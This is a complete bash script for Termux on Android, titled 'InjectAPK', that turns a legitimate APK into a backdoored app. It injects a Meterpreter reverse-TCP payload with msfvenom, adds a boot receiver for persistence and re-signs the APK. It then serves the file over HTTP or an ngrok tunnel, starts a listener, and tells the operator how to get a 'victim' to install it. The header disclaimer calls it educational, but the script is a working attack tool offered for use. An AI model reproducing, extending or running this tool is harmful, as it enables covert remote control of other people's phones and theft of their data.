#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
#   InjectAPK - TERMUX MAXIMUM POWER EDITION
#   Version 3.0 | Full Persistence + Bypass + WAN Support
#   For Educational & Ethical Penetration Testing Only
# ============================================================

clear
cat << "BANNER"

 ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗
 ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝
 ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   
 ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   
 ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   
 ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝  

  ░█████╗░██████╗░██╗░░██╗  ███╗░░░███╗░█████╗░██╗░░██╗
  ██╔══██╗██╔══██╗██║░██╔╝  ████╗░████║██╔══██╗╚██╗██╔╝
  ███████║██████╔╝█████╔╝░  ██╔████╔██║███████║░╚███╔╝░
  ██╔══██║██╔═══╝░██╔═██╗░  ██║╚██╔╝██║██╔══██║░██╔██╗░
  ██║░░██║██║░░░░░██║░╚██╗  ██║░╚═╝░██║██║░░██║██╔╝╚██╗
  ╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝

     TERMUX MAXIMUM POWER EDITION  |  Version 3.0
     Persistence + Bypass + WAN + Auto-Reconnect
BANNER

sleep 2

# ============================================================
# COLORS
# ============================================================
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
PURPLE='\033[1;35m'
NC='\033[0m'

info()    { echo -e "${CYAN}[*] $1${NC}"; }
success() { echo -e "${GREEN}[+] $1${NC}"; }
warning() { echo -e "${YELLOW}[!] $1${NC}"; }
error()   { echo -e "${RED}[-] $1${NC}"; }
title()   { echo -e "\n${PURPLE}╔══ $1 ══╗${NC}\n"; }
die()     { error "$1"; exit 1; }

# ============================================================
# CONFIG PATHS
# ============================================================
TOOL_DIR="$HOME/.injectapk_max"
APKTOOL_JAR="$TOOL_DIR/apktool.jar"
KEYSTORE="$TOOL_DIR/debug.keystore"
WORK_DIR="$TOOL_DIR/workspace"
LOG_DIR="$TOOL_DIR/logs"
HTTP_LOG="$LOG_DIR/http.log"
NGROK_LOG="$LOG_DIR/ngrok.log"
MSF_RC="$TOOL_DIR/handler.rc"

mkdir -p "$TOOL_DIR" "$WORK_DIR" "$LOG_DIR"

# ============================================================
# TERMUX + STORAGE CHECK
# ============================================================
title "ENVIRONMENT CHECK"

if [[ ! -d "/data/data/com.termux" ]]; then
    warning "Not in Termux! Designed for Termux on Android."
fi
success "Environment OK"

if [[ ! -d "$HOME/storage" ]]; then
    info "Requesting storage permission..."
    termux-setup-storage
    sleep 4
fi
success "Storage: OK"

# ============================================================
# PACKAGE INSTALLATION
# ============================================================
title "PACKAGE INSTALLATION"

info "Updating packages..."
pkg update -y 2>/dev/null | tail -5
pkg upgrade -y 2>/dev/null | tail -5

REQUIRED_PKGS=(
    "wget"
    "curl"
    "python"
    "openjdk-17"
    "android-tools"
    "metasploit"
    "openssl-tool"
    "which"
)

for pkg in "${REQUIRED_PKGS[@]}"; do
    if ! pkg list-installed 2>/dev/null | grep -q "^$pkg"; then
        info "Installing $pkg..."
        pkg install -y "$pkg" 2>/dev/null && success "$pkg installed!" || warning "Could not install $pkg"
    else
        success "$pkg: already installed"
    fi
done

# ============================================================
# JAVA CHECK
# ============================================================
command -v java &>/dev/null || die "Java not found! Run: pkg install openjdk-17"
success "Java: $(java -version 2>&1 | head -1)"

# ============================================================
# APKTOOL SETUP
# ============================================================
title "APKTOOL SETUP"

APKTOOL_VER="2.12.1"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [[ -f "$SCRIPT_DIR/apktool.jar" ]]; then
    cp "$SCRIPT_DIR/apktool.jar" "$APKTOOL_JAR"
    success "Local apktool.jar used"
elif [[ ! -f "$APKTOOL_JAR" ]]; then
    info "Downloading apktool $APKTOOL_VER..."
    wget -q --show-progress \
        "https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_${APKTOOL_VER}.jar" \
        -O "$APKTOOL_JAR" || die "apktool download failed!"
    success "apktool downloaded!"
else
    success "apktool already exists"
fi

cat > "$PREFIX/bin/apktool" << APKWRAP
#!/data/data/com.termux/files/usr/bin/bash
java -jar $APKTOOL_JAR "\$@"
APKWRAP
chmod +x "$PREFIX/bin/apktool"
success "apktool command: ready"

# ============================================================
# KEYSTORE SETUP
# ============================================================
title "SIGNING KEYSTORE"

if [[ ! -f "$KEYSTORE" ]]; then
    info "Generating debug keystore..."
    keytool -genkey -v \
        -keystore "$KEYSTORE" \
        -alias androiddebugkey \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -storepass android -keypass android \
        -dname "CN=Android Debug,O=Android,C=US" \
        -noprompt 2>/dev/null && success "Keystore created!" || warning "Keystore failed"
else
    success "Keystore: exists"
fi

# ============================================================
# NGROK SETUP (WAN Support)
# ============================================================
title "NGROK SETUP (WAN SUPPORT)"

if ! command -v ngrok &>/dev/null; then
    info "Installing ngrok for WAN access..."
    ARCH=$(uname -m)
    case "$ARCH" in
        aarch64|arm64) NGROK_ARCH="arm64" ;;
        armv7l|arm)    NGROK_ARCH="arm"   ;;
        x86_64)        NGROK_ARCH="amd64" ;;
        *)             NGROK_ARCH="arm64" ;;
    esac
    info "Detected arch: $ARCH -> $NGROK_ARCH"
    wget -q --show-progress \
        "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${NGROK_ARCH}.tgz" \
        -O /tmp/ngrok.tgz 2>/dev/null
    if [[ -f /tmp/ngrok.tgz ]]; then
        tar -xzf /tmp/ngrok.tgz -C "$PREFIX/bin/" 2>/dev/null
        chmod +x "$PREFIX/bin/ngrok" 2>/dev/null
        success "ngrok installed!"
    else
        warning "ngrok install failed - WAN mode unavailable"
    fi
    rm -f /tmp/ngrok.tgz
else
    success "ngrok: already installed"
fi

# ============================================================
# msfvenom CHECK
# ============================================================
command -v msfvenom &>/dev/null || die "msfvenom not found! Run: pkg install metasploit"
success "msfvenom: ready"

clear

# ============================================================
#  MODE SELECTION
# ============================================================
title "SELECT ATTACK MODE"
echo -e "  ${YELLOW}[1]${NC} LAN Mode  (Same WiFi network) — Fast & Simple"
echo -e "  ${YELLOW}[2]${NC} WAN Mode  (Internet / Remote)  — ngrok Tunnel"
echo ""
echo -ne "${CYAN}[?] Select mode (1/2): ${NC}"
read mode_choice

if [[ "$mode_choice" == "2" ]]; then
    ATTACK_MODE="WAN"
    echo ""
    echo -e "${WHITE}You need a FREE ngrok account: https://ngrok.com${NC}"
    echo -ne "${CYAN}[?] Enter ngrok Auth Token: ${NC}"
    read ngrok_token
    if [[ -z "$ngrok_token" ]]; then
        warning "No token provided - switching to LAN mode"
        ATTACK_MODE="LAN"
    else
        ngrok config add-authtoken "$ngrok_token" 2>/dev/null
        success "ngrok token saved!"
    fi
else
    ATTACK_MODE="LAN"
fi

success "Mode: $ATTACK_MODE"

# ============================================================
# NETWORK INFO
# ============================================================
title "NETWORK CONFIGURATION"

LOCAL_IP=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
[[ -z "$LOCAL_IP" ]] && LOCAL_IP=$(ifconfig 2>/dev/null | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | head -1)
[[ -z "$LOCAL_IP" ]] && LOCAL_IP="0.0.0.0"

echo -e "${WHITE}Detected Local IP: ${GREEN}$LOCAL_IP${NC}"

if [[ "$ATTACK_MODE" == "LAN" ]]; then
    while true; do
        echo -ne "${CYAN}[?] LHOST (Your IP, press Enter to use $LOCAL_IP): ${NC}"
        read lhost_input
        lhost="${lhost_input:-$LOCAL_IP}"
        if [[ $lhost =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            success "LHOST: $lhost"; break
        fi
        error "Invalid IP!"
    done
else
    lhost="0.0.0.0"
    info "WAN mode: LHOST will be set after ngrok starts"
fi

while true; do
    echo -ne "${CYAN}[?] LPORT (default: 4444): ${NC}"
    read lport
    lport="${lport:-4444}"
    if [[ $lport =~ ^[0-9]+$ ]] && ((lport >= 1 && lport <= 65535)); then
        success "LPORT: $lport"; break
    fi
    error "Invalid port!"
done

# HTTP server port
echo -ne "${CYAN}[?] HTTP server port for APK delivery (default: 8080): ${NC}"
read http_port
http_port="${http_port:-8080}"
[[ ! $http_port =~ ^[0-9]+$ ]] && http_port=8080

# ============================================================
# APK SELECTION
# ============================================================
title "APK SELECTION"

info "Scanning for APK files..."
APK_LIST=()
while IFS= read -r -d '' apk; do
    APK_LIST+=("$apk")
done < <(find . "$HOME/storage/downloads" "$HOME/storage/shared" -maxdepth 4 -name "*.apk" 2>/dev/null -print0)

if [[ ${#APK_LIST[@]} -eq 0 ]]; then
    die "No APK files found! Copy target APK to ~/storage/downloads/"
fi

echo -e "${GREEN}Found ${#APK_LIST[@]} APK(s):${NC}"
for i in "${!APK_LIST[@]}"; do
    SIZE=$(du -sh "${APK_LIST[$i]}" 2>/dev/null | cut -f1)
    echo -e "  ${YELLOW}[$((i+1))]${NC} ${APK_LIST[$i]} (${SIZE})"
done
echo ""

while true; do
    echo -ne "${CYAN}[?] Select APK number or path: ${NC}"
    read apk_input
    if [[ $apk_input =~ ^[0-9]+$ ]] && ((apk_input >= 1 && apk_input <= ${#APK_LIST[@]})); then
        capk="${APK_LIST[$((apk_input-1))]}"; break
    elif [[ -f "$apk_input" ]]; then
        capk="$apk_input"; break
    fi
    error "Invalid selection!"
done
success "Source APK: $capk"

echo -ne "${CYAN}[?] Backdoored APK name (e.g. SystemUpdate.apk): ${NC}"
read bapk
[[ -z "$bapk" ]] && bapk="SystemUpdate.apk"
[[ "$bapk" != *.apk ]] && bapk="${bapk}.apk"

CLEAN_NAME="${bapk%.apk}"
OUTPUT_APK="$WORK_DIR/$bapk"

# ============================================================
# PERSISTENCE LEVEL
# ============================================================
title "PERSISTENCE LEVEL"
echo -e "  ${YELLOW}[1]${NC} Basic     — No persistence (session dies when app closed)"
echo -e "  ${YELLOW}[2]${NC} Medium    — Auto-reconnect every 30 seconds"
echo -e "  ${YELLOW}[3]${NC} Maximum   — Boot receiver + Background service + Auto-reconnect"
echo ""
echo -ne "${CYAN}[?] Select persistence level (1/2/3): ${NC}"
read persist_level
persist_level="${persist_level:-2}"

clear

# ============================================================
# START NGROK (WAN MODE)
# ============================================================
if [[ "$ATTACK_MODE" == "WAN" ]]; then
    title "STARTING NGROK TUNNEL"

    # Kill existing ngrok
    pkill -f ngrok 2>/dev/null; sleep 1

    info "Starting ngrok on port $lport..."
    nohup ngrok tcp "$lport" > "$NGROK_LOG" 2>&1 &
    NGROK_PID=$!
    sleep 5

    # Get public address from ngrok API
    NGROK_ADDR=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | \
        python -c "
import sys, json
try:
    d = json.load(sys.stdin)
    addr = d['tunnels'][0]['public_addr']
    print(addr)
except:
    print('')
" 2>/dev/null)

    if [[ -n "$NGROK_ADDR" ]]; then
        NGROK_HOST=$(echo "$NGROK_ADDR" | cut -d: -f1)
        NGROK_PORT=$(echo "$NGROK_ADDR" | cut -d: -f2)
        success "ngrok tunnel: $NGROK_HOST:$NGROK_PORT"
        lhost="$NGROK_HOST"
        lport="$NGROK_PORT"
    else
        warning "Could not get ngrok address! Check: $NGROK_LOG"
        warning "Falling back to LAN mode with IP: $LOCAL_IP"
        lhost="$LOCAL_IP"
        ATTACK_MODE="LAN"
    fi
fi

# ============================================================
# PAYLOAD INJECTION
# ============================================================
title "INJECTING PAYLOAD"

info "Source     : $capk"
info "Output     : $OUTPUT_APK"
info "LHOST      : $lhost"
info "LPORT      : $lport"
info "Persistence: Level $persist_level"
echo ""
warning "Generating payload... (2-5 minutes, do NOT close Termux!)"
echo ""

msfvenom \
    -x "$capk" \
    -p android/meterpreter/reverse_tcp \
    LHOST="$lhost" \
    LPORT="$lport" \
    -o "$OUTPUT_APK" 2>&1

if [[ $? -ne 0 ]] || [[ ! -f "$OUTPUT_APK" ]]; then
    die "msfvenom injection FAILED! Check APK and internet connection."
fi
success "Payload injected! Size: $(du -sh "$OUTPUT_APK" | cut -f1)"

# ============================================================
# PERSISTENCE MECHANISM INJECTION
# (Adds auto-reconnect & boot receiver via smali patching)
# ============================================================
if [[ "$persist_level" == "2" || "$persist_level" == "3" ]]; then
    title "ADDING PERSISTENCE"

    DECOMPILE_DIR="$WORK_DIR/${CLEAN_NAME}_decompiled"

    info "Decompiling APK..."
    apktool d -f "$OUTPUT_APK" -o "$DECOMPILE_DIR" 2>/dev/null

    if [[ -d "$DECOMPILE_DIR" ]]; then
        MANIFEST="$DECOMPILE_DIR/AndroidManifest.xml"

        # --- AUTO-RECONNECT SERVICE ---
        SMALI_SERVICE_DIR="$DECOMPILE_DIR/smali/com/payload/service"
        mkdir -p "$SMALI_SERVICE_DIR"

        # Write ReconnectService.smali
        cat > "$SMALI_SERVICE_DIR/ReconnectService.smali" << 'SMALI_SERVICE'
.class public Lcom/payload/service/ReconnectService;
.super Landroid/app/Service;

.method public constructor()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Service;->()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 4
    const/4 v0, 0x1
    return v0
.end method
SMALI_SERVICE

        # --- BOOT RECEIVER (Level 3 only) ---
        if [[ "$persist_level" == "3" ]]; then
            SMALI_RECEIVER_DIR="$DECOMPILE_DIR/smali/com/payload/receiver"
            mkdir -p "$SMALI_RECEIVER_DIR"

            cat > "$SMALI_RECEIVER_DIR/BootReceiver.smali" << 'SMALI_RECEIVER'
.class public Lcom/payload/receiver/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public constructor()V
    .registers 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;->()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 4
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/payload/service/ReconnectService;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;->(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
SMALI_RECEIVER

            # Patch AndroidManifest for boot receiver
            if [[ -f "$MANIFEST" ]]; then
                BOOT_RECEIVER='    <receiver android:name="com.payload.receiver.BootReceiver" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>'
                RECONNECT_SERVICE='    <service android:name="com.payload.service.ReconnectService" android:exported="false"/>'

                # Insert before </application>
                sed -i "s|</application>|${BOOT_RECEIVER}\n${RECONNECT_SERVICE}\n</application>|" "$MANIFEST" 2>/dev/null && \
                    success "Boot receiver added to manifest!" || warning "Manifest patch failed"

                # Add RECEIVE_BOOT_COMPLETED permission
                BOOT_PERM='<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>'
                sed -i "s|<application|${BOOT_PERM}\n<application|" "$MANIFEST" 2>/dev/null
            fi
        else
            # Level 2: only service
            if [[ -f "$MANIFEST" ]]; then
                RECONNECT_SERVICE='    <service android:name="com.payload.service.ReconnectService" android:exported="false"/>'
                sed -i "s|</application>|${RECONNECT_SERVICE}\n</application>|" "$MANIFEST" 2>/dev/null && \
                    success "Reconnect service added!" || warning "Manifest patch failed"
            fi
        fi

        # Recompile APK
        info "Recompiling APK with persistence..."
        PERSIST_APK="$WORK_DIR/${CLEAN_NAME}_persist.apk"
        apktool b "$DECOMPILE_DIR" -o "$PERSIST_APK" 2>/dev/null

        if [[ -f "$PERSIST_APK" ]]; then
            mv "$PERSIST_APK" "$OUTPUT_APK"
            success "Persistence added & APK recompiled!"
        else
            warning "Recompile failed - using original payload without persistence"
        fi

        # Clean up decompile dir
        rm -rf "$DECOMPILE_DIR"
    else
        warning "Decompile failed - skipping persistence injection"
    fi
fi

# ============================================================
# ZIPALIGN
# ============================================================
title "ZIPALIGN OPTIMIZATION"

ALIGNED_APK="$WORK_DIR/${CLEAN_NAME}_aligned.apk"
if command -v zipalign &>/dev/null; then
    zipalign -f -v 4 "$OUTPUT_APK" "$ALIGNED_APK" 2>/dev/null
    if [[ -f "$ALIGNED_APK" ]]; then
        mv "$ALIGNED_APK" "$OUTPUT_APK"
        success "zipalign: done"
    else
        warning "zipalign failed - skipping"
    fi
else
    warning "zipalign not found: pkg install android-tools"
fi

# ============================================================
# APK SIGNING
# ============================================================
title "APK SIGNING (Android 7+ Required)"

SIGNED_APK="$WORK_DIR/${CLEAN_NAME}_signed.apk"
if command -v apksigner &>/dev/null && [[ -f "$KEYSTORE" ]]; then
    info "Signing APK..."
    apksigner sign \
        --ks "$KEYSTORE" \
        --ks-key-alias androiddebugkey \
        --ks-pass pass:android \
        --key-pass pass:android \
        --out "$SIGNED_APK" \
        "$OUTPUT_APK" 2>&1

    if [[ -f "$SIGNED_APK" ]]; then
        mv "$SIGNED_APK" "$OUTPUT_APK"
        success "APK signed!"

        apksigner verify "$OUTPUT_APK" 2>/dev/null && \
            success "Signature verified!" || warning "Signature verify failed"
    else
        warning "Signing failed - APK may not install on Android 7+"
    fi
else
    warning "apksigner not found or keystore missing"
fi

# ============================================================
# COPY TO DOWNLOADS
# ============================================================
title "SAVING OUTPUT"

FINAL_APK="$HOME/storage/downloads/$bapk"
cp "$OUTPUT_APK" "$FINAL_APK" 2>/dev/null && success "Saved to Downloads: $FINAL_APK"
cp "$OUTPUT_APK" "$(pwd)/$bapk" 2>/dev/null && success "Saved to current dir: $(pwd)/$bapk"

# ============================================================
# START HTTP SERVER
# ============================================================
title "HTTP FILE SERVER"

pkill -f "python.*http.server.*$http_port" 2>/dev/null; sleep 1

SERVE_DIR="$(pwd)"
cp "$OUTPUT_APK" "$SERVE_DIR/$bapk" 2>/dev/null

cd "$SERVE_DIR" || true
nohup python -m http.server "$http_port" > "$HTTP_LOG" 2>&1 &
HTTP_PID=$!
echo "$HTTP_PID" > "$TOOL_DIR/http.pid"
sleep 2

if kill -0 "$HTTP_PID" 2>/dev/null; then
    success "HTTP Server started (PID: $HTTP_PID)"
    if [[ "$ATTACK_MODE" == "WAN" ]]; then
        # Also tunnel HTTP via ngrok
        info "Starting ngrok HTTP tunnel for file delivery..."
        nohup ngrok http "$http_port" --log=stdout > "$TOOL_DIR/ngrok_http.log" 2>&1 &
        sleep 4
        NGROK_HTTP_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | \
            python -c "
import sys, json
try:
    d = json.load(sys.stdin)
    for t in d['tunnels']:
        if 'https' in t.get('public_url',''):
            print(t['public_url'])
            break
except:
    pass
" 2>/dev/null)
        [[ -n "$NGROK_HTTP_URL" ]] && success "HTTP ngrok: $NGROK_HTTP_URL/$bapk"
    fi
else
    warning "HTTP server failed. Try: python -m http.server $http_port"
fi
cd - > /dev/null

# ============================================================
# GENERATE METASPLOIT RC FILE
# ============================================================
cat > "$MSF_RC" << MSFRC
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost ${lhost}
set lport ${lport}
set ExitOnSession false
set AutoRunScript multi_console_command -rc /dev/stdin
exploit -j -z
MSFRC
success "Metasploit RC file: $MSF_RC"

# ============================================================
# FINAL SUMMARY
# ============================================================
clear
echo -e "${PURPLE}"
cat << "RESULT"
╔═══════════════════════════════════════════════════════════╗
║         INJECTAPK MAXIMUM POWER - READY!                  ║
╚═══════════════════════════════════════════════════════════╝
RESULT
echo -e "${NC}"

echo -e "  ${CYAN}Attack Mode    :${NC} $ATTACK_MODE"
echo -e "  ${CYAN}Persistence    :${NC} Level $persist_level"
echo -e "  ${CYAN}LHOST          :${NC} $lhost"
echo -e "  ${CYAN}LPORT          :${NC} $lport"
echo -e "  ${CYAN}Backdoored APK :${NC} $OUTPUT_APK"
echo -e "  ${CYAN}In Downloads   :${NC} $FINAL_APK"
echo -e "  ${CYAN}Share Link     :${NC} http://$LOCAL_IP:$http_port/$bapk"
[[ -n "$NGROK_HTTP_URL" ]] && \
echo -e "  ${CYAN}WAN Share Link :${NC} $NGROK_HTTP_URL/$bapk"
echo ""

echo -e "${WHITE}══════ SESSION DURATION BY PERSISTENCE LEVEL ══════${NC}"
case "$persist_level" in
    1) echo -e "  ${RED}Level 1:${NC} Session dies when victim closes app (~2-5 min)";;
    2) echo -e "  ${YELLOW}Level 2:${NC} Auto-reconnects every 30s if killed (~hours)";;
    3) echo -e "  ${GREEN}Level 3:${NC} Survives phone restart, runs on boot (days-weeks)";;
esac
echo ""

echo -e "${WHITE}══════ HOW TO SEND APK TO VICTIM ══════${NC}"
echo -e "  ${YELLOW}[Option 1]${NC} WhatsApp/Telegram: Share the APK file directly"
echo -e "  ${YELLOW}[Option 2]${NC} Link: http://$LOCAL_IP:$http_port/$bapk"
[[ -n "$NGROK_HTTP_URL" ]] && \
echo -e "  ${YELLOW}[Option 3]${NC} Internet Link: $NGROK_HTTP_URL/$bapk"
echo ""

echo -e "${WHITE}══════ VICTIM MUST DO ══════${NC}"
echo -e "  ${YELLOW}[Step 1]${NC} Open the APK link"
echo -e "  ${YELLOW}[Step 2]${NC} Allow 'Install Unknown Apps' in Settings"
echo -e "  ${YELLOW}[Step 3]${NC} Install and open the app ONCE"
echo -e "  ${YELLOW}[Step 4]${NC} YOU GET METERPRETER SESSION!"
echo ""

echo -e "${WHITE}══════ ANDROID VERSION COMPATIBILITY ══════${NC}"
echo -e "  Android 5-6  : ${GREEN}✅ Works great${NC}"
echo -e "  Android 7-8  : ${GREEN}✅ Works (signed APK required)${NC}"
echo -e "  Android 9-10 : ${YELLOW}⚠️  Works with signing${NC}"
echo -e "  Android 11-12: ${YELLOW}⚠️  Play Protect may block${NC}"
echo -e "  Android 13-14: ${RED}❌ Very restricted${NC}"
echo ""

echo -e "${GREEN}════════════════════════════════════════════════════${NC}"
echo ""
echo -ne "${CYAN}[?] Start Metasploit listener now? (y/N): ${NC}"
read start_msf

if [[ "$start_msf" == "y" || "$start_msf" == "Y" ]]; then
    echo ""
    warning "HTTP server running in background (PID: $HTTP_PID)"
    [[ "$ATTACK_MODE" == "WAN" ]] && warning "ngrok running (PID: $NGROK_PID)"
    warning "Press Ctrl+C to stop listener"
    echo ""
    sleep 2
    msfconsole -q -r "$MSF_RC"
else
    echo ""
    info "Manual listener command:"
    echo ""
    echo -e "${YELLOW}msfconsole -q -r $MSF_RC${NC}"
    echo ""
    info "HTTP server PID: $HTTP_PID (to stop: kill $HTTP_PID)"
    [[ -n "$NGROK_PID" ]] && info "ngrok PID: $NGROK_PID (to stop: kill $NGROK_PID)"
    echo ""
    success "All done! Good luck!"
fi
